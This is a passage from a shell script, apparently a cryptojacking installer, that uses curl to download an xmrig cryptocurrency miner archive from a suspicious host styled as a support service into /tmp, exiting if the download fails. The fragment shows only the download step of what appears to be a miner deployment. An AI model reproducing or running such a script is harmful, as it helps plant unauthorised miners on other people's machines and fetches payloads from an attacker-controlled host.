...
if ! curl -L --progress-bar "http://support365.ml:8080/dl/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download http://support365.ml:8080/dl/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
  exit 1
fi
